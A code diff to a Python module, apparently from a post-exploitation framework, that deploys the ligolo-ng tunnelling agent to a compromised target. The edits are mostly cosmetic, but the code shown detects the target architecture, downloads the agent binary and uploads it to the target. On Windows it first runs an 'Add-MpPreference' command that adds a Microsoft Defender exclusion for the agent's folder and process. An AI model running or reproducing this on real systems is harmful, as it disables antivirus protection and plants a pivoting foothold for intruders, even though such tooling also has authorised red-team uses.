@@ -112,7 +112,7 @@ class LigoloModule(KoiModule):
     def run(self) -> None:
         os_type = self.session.os_type
 
-        with self.spinner("Detecting target architecture…"):
+        with self.spinner("Detecting target architecture..."):
             try:
                 arch = self._detect_arch()
             except Exception as exc:
@@ -122,7 +122,7 @@ class LigoloModule(KoiModule):
         os_name = "windows" if "windows" in os_type else "linux"
         self.status(f"Target: {os_name}/{arch}")
 
-        with self.spinner("Fetching latest ligolo-ng release info…"):
+        with self.spinner("Fetching latest ligolo-ng release info..."):
             try:
                 tag, assets = self._latest_release()
             except Exception as exc:
@@ -139,7 +139,7 @@ class LigoloModule(KoiModule):
 
         self.status(f"Asset: {asset['name']}  ({asset['size'] // 1024} KB)")
 
-        with self.spinner("Downloading and extracting agent binary…"):
+        with self.spinner("Downloading and extracting agent binary..."):
             try:
                 agent_bytes = self._fetch_agent(asset, os_name)
             except Exception as exc:
@@ -151,22 +151,20 @@ class LigoloModule(KoiModule):
         if self.args.output:
             dest = self.args.output
         elif os_name == "windows":
-            cwd = self._win_query("(Get-Location).Path").strip() or "C:\\Windows\\Temp"
-            dest = cwd + "\\agent.exe"
+            dest = ".\\agent.exe"
         else:
-            cwd = self._exec_clean("pwd").strip() or "/tmp"
-            dest = cwd + "/agent"
+            dest = "./agent"
 
         if os_name == "windows":
             import ntpath
             dest_dir = ntpath.dirname(dest)
-            with self.spinner("Adding Defender exclusion…"):
+            with self.spinner("Adding Defender exclusion..."):
                 self._win_query(
                     f"Add-MpPreference -ExclusionPath '{dest_dir}' -ExclusionProcess '{dest}'"
                 )
             self.status(f"Defender exclusion added for {dest_dir}")
 
-        self.status(f"Uploading to {dest}…")
+        self.status(f"Uploading to {dest}...")
         transfer_timeout = max(60, len(agent_bytes) // 50_000 + 30)
         bar = self.ui.ProgressBar(total=len(agent_bytes))
         ok = self._upload_bytes(agent_bytes, dest, timeout=transfer_timeout, on_progress=bar.update)
